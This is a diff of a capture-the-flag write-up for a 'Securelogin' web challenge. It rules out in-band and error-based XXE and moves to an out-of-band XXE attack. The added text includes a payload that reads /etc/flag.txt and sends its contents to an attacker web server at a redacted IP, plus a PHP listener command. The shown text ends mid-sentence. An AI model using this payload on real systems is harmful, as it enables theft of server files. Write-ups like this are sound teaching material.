@@ -102,7 +102,17 @@ We can check that by using the same script, but this time let's change the crede
 
 Still nothing... 
 
-What about completely changing the XML body? Nope, still the same error. There is no more new information available it seems. We just need to `Try Harder!`
+What about completely changing the XML body?
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<a>
+	<b>Trying Harder!</b>
+</a>
+```
+
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/creds_not_found.png">
+
+Nope, still the same error. There is no more new information available it seems. We just need to `Try Harder!`
 
 <br />
 
@@ -212,7 +222,7 @@ Now that we have established some prerequisites regarding XML we can proceed to 
 
 There are mainly 3 types of XXE attacks. Inband XXE, Error Based XXE and Out-of-Band XXE (OOB-XXE).
 
-In an Inband XXE the result will be directly shown on the user. Taking a look at the original XML data sent with the POST request shows us that realistically there would be 2 points of injections, the `user` and `pass` field.
+In an Inband XXE the result will be directly shown on the user. Previous testing shows us that no output is rendered to the webpage
 
 As we previously tried to authenticate as admin, we were greeted with the error message `Username or password not found! Try Harder!`. As we can see, we get no output based on our input. This means that we can leave out Inband XXE, since that doesn't seem to be possible in this scenario.
 
@@ -220,3 +230,28 @@ The second type of XXE attack is error based, but as we already noticed before, 
 
 So we are only left with Out-of-Band XXE. Let's take a deeper dive into OOB-XXE to see how we can use it to exploit the server.
 
+Since we are working with Out-of-Band XXE we cannot see any results until we have completely fabricated a working exploit.
+
+Now how would we be able to see the file contents of `/etc/flag.txt` when no data is rendered to the screen? One common method to overcome this problem is to exfiltrate data in the form of HTTP requests.
+
+We just need the server to do a simple HTTP GET request passing the file contents as a GET parameter to a webserver that we have access to. Let's try doing just that:
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE Credentials [
+	<!ENTITY % flag SYSTEM "file:///etc/flag.txt">
+	<!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
+	%XXE;
+]>
+<creds>
+	&exfil;
+</creds>
+```
+
+This reads the file contents of `/etc/flag.txt` to a parameter entity `flag`. Then the XXE parameter entity defines a general entity, which is later on referenced in the XML body.
+
+This should trigger the server to make a HTTP GET request to our webserver with passing the file contents as a GET parameter.
+
+Let's quickly set up our webserver with `php -S 0.0.0.0:80`
+<img src="https://github.com/Sanduuz/CTFWriteUps/blob/master/challenge.fi/Web/Securelogin/attachments/php-server.png">
+
+However, when we send that XML document to the server,
